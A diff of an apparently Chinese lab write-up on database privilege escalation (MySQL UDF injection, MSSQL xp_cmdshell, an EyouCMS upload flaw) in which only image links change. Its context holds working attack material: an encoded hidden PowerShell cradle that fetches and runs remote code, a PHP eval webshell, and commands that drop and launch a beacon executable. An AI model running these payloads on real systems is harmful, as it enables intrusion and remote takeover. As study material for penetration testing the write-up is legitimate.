 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%char%&#x27;</span>;<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>;<br><span class="hljs-keyword">select</span> version();<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105721000.png" srcset="/img/loading.gif" lazyload alt="image-20240215105721000"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105721000.png" srcset="/img/loading.gif" lazyload alt="image-20240215105721000"></p>
 <p>如果是phpstudy的话，在mysql 同一个目录之下有一个www目录就是网站目录</p>
 </li>
 <li><p>查看plugin目录路径</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@plugin</span>_dir;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105918482.png" srcset="/img/loading.gif" lazyload alt="image-20240215105918482"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215105918482.png" srcset="/img/loading.gif" lazyload alt="image-20240215105918482"></p>
 <p>该目录就是放置dll 文件的地方‘</p>
 </li>
 <li><p>查看是否存在写权限</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215110338733.png" srcset="/img/loading.gif" lazyload alt="image-20240215110338733"> </p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215110338733.png" srcset="/img/loading.gif" lazyload alt="image-20240215110338733"> </p>
 <blockquote>
 <p>secure-file-priv 参数是用来限制 LOAD  DATA, SELECT … INTO OUTFILE, and LOAD_FILE()传 到哪个指定目录的。  </p>
 <p>当 secure-file-priv 的值为 NULL ，表示限制 mysqld 不允许导入、导出  </p>
@@ -463,7 +463,7 @@
 <p>Linux：修改 my.cnf 在[mysqld]内加入secure_file_priv&#x3D;，重启mysql  </p>
 </blockquote>
 <p>我这里靶场的原因我就直接修改了</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112131932.png" srcset="/img/loading.gif" lazyload alt="image-20240215112131932"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112131932.png" srcset="/img/loading.gif" lazyload alt="image-20240215112131932"></p>
 </li>
 <li><p>mysql 写文件</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;111&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\1.txt&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;222&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\2.txt&#x27;</span>;<br></code></pre></td></tr></table></figure>
@@ -480,15 +480,15 @@
 </blockquote>
 <p>当拥有可以写入的权限之后</p>
 <p>就可以尝试写文件了</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112346100.png" srcset="/img/loading.gif" lazyload alt="image-20240215112346100"></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112404664.png" srcset="/img/loading.gif" lazyload alt="image-20240215112404664"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112346100.png" srcset="/img/loading.gif" lazyload alt="image-20240215112346100"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112404664.png" srcset="/img/loading.gif" lazyload alt="image-20240215112404664"></p>
 <p>成功写入</p>
 </li>
 <li><p>创建plugin目录</p>
 <blockquote>
 <p>在MySQL5.1以后的环境下只有将udf.dll文件导出到MySQL安装目录\lib\plugin\目录下才  能成功，但是很多时候mysql安装目录下并不存在lib目录，mysql文件操作也并不能直接创建  目录，此时需要通过NTFS ADS流来创建目录。  </p>
 </blockquote>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112550900.png" srcset="/img/loading.gif" lazyload alt="image-20240215112550900"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215112550900.png" srcset="/img/loading.gif" lazyload alt="image-20240215112550900"></p>
 <p>我这里就没有存在</p>
 <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">select &#x27;xxx&#x27; into dumpfile &#x27;C:<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin::$INDEX_ALLOCATION&#x27;;<br><br></code></pre></td></tr></table></figure>
 
@@ -517,7 +517,7 @@
 <li><p>查看test.txt文件，读取正常</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">test.txt </span># 查看文件类型<br><span class="hljs-string">&quot;this is a test file&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215122209811.png" srcset="/img/loading.gif" lazyload alt="image-20240215122209811"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215122209811.png" srcset="/img/loading.gif" lazyload alt="image-20240215122209811"></p>
 <p>当使用echo 输入的时候会发现并没有这个文件，但是我们使用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /r<br></code></pre></td></tr></table></figure>
 
@@ -566,7 +566,7 @@
 <p>将udf.dll二进制数据插入临时表udftemp中，$binaryCode为udf.txt文件中复制的内容。  </p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">into</span> udf <span class="hljs-keyword">values</span>(<span class="hljs-keyword">CONVERT</span>(二进制文件,<span class="hljs-type">CHAR</span>));<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/headImg.action" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/headImg.action" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 </li>
 <li><p>将dll导出到plugin目录</p>
 </li>
@@ -588,11 +588,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 创建临时表<br>create table beacon(data longblob);<br><br># 转换beacon.exe二进制内容为十六进制<br>select hex(load_file(&#x27;C:\\beacon.exe&#x27;)) into dumpfile &#x27;C:\\beacon.txt&#x27;;<br><br># 将16进制beacon文件写入beacon表<br>insert into beacon(data) values (0x+beacon.txt中的值);<br><br># 写入beacon.exe<br>select data from beacon into dumpfile &quot;C:\\beacon.exe&quot;;<br><br># 利用创建的命令执行函数执行beacon.exe<br>select sys_eval(&#x27;start c:\\beacon.exe&#x27;)<br></code></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="msf-自动提权"><a href="#msf-自动提权" class="headerlink" title="msf 自动提权"></a>msf 自动提权</h2><p>exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload  </p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215134913223.png" srcset="/img/loading.gif" lazyload alt="image-20240215134913223"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215134913223.png" srcset="/img/loading.gif" lazyload alt="image-20240215134913223"></p>
 <p>没有上线</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215144628397.png" srcset="/img/loading.gif" lazyload alt="image-20240215144628397"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215144628397.png" srcset="/img/loading.gif" lazyload alt="image-20240215144628397"></p>
 <p>发现已经创建了这个dll</p>
-<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="MSSQL角色用户权限"><a href="#MSSQL角色用户权限" class="headerlink" title="MSSQL角色用户权限"></a>MSSQL角色用户权限</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215145039673.png" srcset="/img/loading.gif" lazyload alt="image-20240215145039673"></p>
+<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="MSSQL角色用户权限"><a href="#MSSQL角色用户权限" class="headerlink" title="MSSQL角色用户权限"></a>MSSQL角色用户权限</h2><p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215145039673.png" srcset="/img/loading.gif" lazyload alt="image-20240215145039673"></p>
 <p>通过查看用户身份判断是不是dbcreator或者是sysadmin ，如果是才能利用，如果不是的话，会有很多问题</p>
 <h2 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令"></a>常用的指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mssql"># 查看数据库版本<br>select @@version<br><br># 查看数据库系统参数<br>exec master..xp_msver;<br><br># 查看用户所属角色信息<br>sp_helpsrvrolemember<br><br># 查看当前数据库<br>select db_name();<br><br># 查看当前账户权限<br>select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)  #判断是否为sa权限<br>select IS_MEMBER(&#x27;db_owner&#x27;)         #判断是否为dba权限<br><br># 禁用advanced options<br>exec sp_configure &#x27;show advanced options&#x27;,0;GO RECONFIGURE;<br></code></pre></td></tr></table></figure>
 
@@ -626,14 +626,14 @@
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master..xp_cmdshell &quot;ver&quot;;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215152920401.png" srcset="/img/loading.gif" lazyload alt="image-20240215152920401"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215152920401.png" srcset="/img/loading.gif" lazyload alt="image-20240215152920401"></p>
 <p>如果像这样的话，就是没有开启</p>
 </li>
 <li><p>启用 xp_cmdshell  </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;<br>exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;<br><br></code></pre></td></tr></table></figure>
 
 <p>设置完成之后</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153044752.png" srcset="/img/loading.gif" lazyload alt="image-20240215153044752"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153044752.png" srcset="/img/loading.gif" lazyload alt="image-20240215153044752"></p>
 <p>就可以通过使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master..xp_cmdshell &quot;ver&quot;;<br></code></pre></td></tr></table></figure>
 
@@ -648,7 +648,7 @@
 <li><p>或者直接执行payload </p>
 <p>web_delivery</p>
 <p>只用这个模块</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153647318.png" srcset="/img/loading.gif" lazyload alt="image-20240215153647318"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215153647318.png" srcset="/img/loading.gif" lazyload alt="image-20240215153647318"></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-e</span> WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABuAEMAbABlAGwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbgBDAGwAZQBsAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbgBDAGwAZQBsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADAAMAAxADoAOAAwADgAMAAvADIAbgBUAHMAcwBKAHMAMQAvADgAYQB3AEgAcQBoAHMAYwB2AGQAYwAzADUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAwADAAMQA6ADgAMAA4ADAALwAyAG4AVABzAHMASgBzADEAJwApACkAOwA=<br><br></code></pre></td></tr></table></figure>
 
 <p>让其运行这个payload 然后就能获取对应的</p>
@@ -715,48 +715,48 @@
 <h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>0x00 简介</p>
 <p>已知目标的网站</p>
 <p><a target="_blank" rel="noopener" href="http://www.heti.com/">http://www.heti.com</a></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161200237.png" srcset="/img/loading.gif" lazyload alt="image-20240215161200237"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161200237.png" srcset="/img/loading.gif" lazyload alt="image-20240215161200237"></p>
 <p>发现易优cms，尝试收集漏洞</p>
 <p>直接搜索</p>
 <p>然后发现可能存在漏洞，前台getshell </p>
 <p>尝试利用</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.heti.com<span class="hljs-regexp">/index.php/</span>api<span class="hljs-regexp">/Uploadify/</span>preview<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161356356.png" srcset="/img/loading.gif" lazyload alt="image-20240215161356356"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161356356.png" srcset="/img/loading.gif" lazyload alt="image-20240215161356356"></p>
 <p>发现存在漏洞</p>
 <p>0x01</p>
 <p>开启bp 抓包</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161801232.png" srcset="/img/loading.gif" lazyload alt="image-20240215161801232"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161801232.png" srcset="/img/loading.gif" lazyload alt="image-20240215161801232"></p>
 <p>改为post </p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161831849.png" srcset="/img/loading.gif" lazyload alt="image-20240215161831849"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161831849.png" srcset="/img/loading.gif" lazyload alt="image-20240215161831849"></p>
 <p>构造payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">data:image/php;<span class="hljs-built_in">base64</span>, PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=<br></code></pre></td></tr></table></figure>
 
 <p>注意这个是php 的一句话木马</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161938401.png" srcset="/img/loading.gif" lazyload alt="image-20240215161938401"></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162022370.png" srcset="/img/loading.gif" lazyload alt="image-20240215162022370"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215161938401.png" srcset="/img/loading.gif" lazyload alt="image-20240215161938401"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162022370.png" srcset="/img/loading.gif" lazyload alt="image-20240215162022370"></p>
 <p>发送之后获取上传的文件路径</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="http://www.heti.com/preview/a2a0b7436e8f2bb1d951a830ec83340f.php">http://www.heti.com/preview/a2a0b7436e8f2bb1d951a830ec83340f.php</a></p>
 </blockquote>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162259053.png" srcset="/img/loading.gif" lazyload alt="image-20240215162259053"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162259053.png" srcset="/img/loading.gif" lazyload alt="image-20240215162259053"></p>
 <p>上传成功</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162344359.png" srcset="/img/loading.gif" lazyload alt="image-20240215162344359"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215162344359.png" srcset="/img/loading.gif" lazyload alt="image-20240215162344359"></p>
 <p>无法执行命令</p>
 <p>0x02  提权</p>
 <p>由于发现没有办法进行执行命令，所以尝试提权</p>
 <p>搜索文件结构发现存在phpstudy</p>
 <p>找到了mysql 的配置文件，尝试寻找user 和password</p>
 <p>通过解密获取了密码是root123</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172129452.png" srcset="/img/loading.gif" lazyload alt="image-20240215172129452"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215172129452.png" srcset="/img/loading.gif" lazyload alt="image-20240215172129452"></p>
 <p>注意这个是mysqli</p>
 <p>0x03 mysql 提权</p>
 <p>查看路径是否可以写</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165407281.png" srcset="/img/loading.gif" lazyload alt="image-20240215165407281"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165407281.png" srcset="/img/loading.gif" lazyload alt="image-20240215165407281"></p>
 <p>发现可以</p>
 <p>查看mysql 安装目录</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165531521.png" srcset="/img/loading.gif" lazyload alt="image-20240215165531521"></p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165638535.png" srcset="/img/loading.gif" lazyload alt="image-20240215165638535"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165531521.png" srcset="/img/loading.gif" lazyload alt="image-20240215165531521"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/%E6%B8%97%E9%80%8F/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83/image-20240215165638535.png" srcset="/img/loading.gif" lazyload alt="image-20240215165638535"></p>
 <blockquote>
 <p>当 <code>MySQL&lt;5.1</code> 版本时，将<code>.dll</code>文件导入到<code>C:\windows</code>或者<code>C:\windows\system32</code>目录下。</p>
 <p>当 <code>MySQL&gt;5.1</code> 版本时，将<code>.dll</code>文件导入到<code>MySQL5.xx\lib\plugin</code> 目录下 （lib\plugin目录默认不存在，需自行创建）。</p>
@@ -765,8 +765,8 @@
 <li><p>创建文件夹</p>
